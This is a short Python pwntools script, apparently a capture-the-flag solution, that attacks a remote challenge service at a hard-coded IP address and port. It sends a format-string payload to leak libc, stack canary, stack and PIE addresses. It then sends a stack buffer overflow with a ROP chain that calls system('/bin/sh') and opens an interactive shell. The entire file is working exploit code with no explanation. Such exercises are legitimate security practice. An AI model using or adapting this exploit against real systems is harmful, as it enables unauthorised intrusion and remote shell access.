#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote("34.252.33.37", 31302)

io.sendlineafter(b"name:", b"%33$lx.%47$lx.%48$lx.%49$lx")
io.recvline()
libc_leak, canary, stack_leak, pie_leak = io.recvline().strip().decode().split('.')

libc.address = int(libc_leak, 16) - 0x1d3760
pie_base     = int(pie_leak, 16)  - 0x12ce

io.sendlineafter(b"msg:", b"A"*328 + p64(int(canary, 16)) + p64(int(stack_leak, 16)) + p64(libc.address + 0x26e99) + p64(libc.address + 0x277e5) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system))
io.interactive()

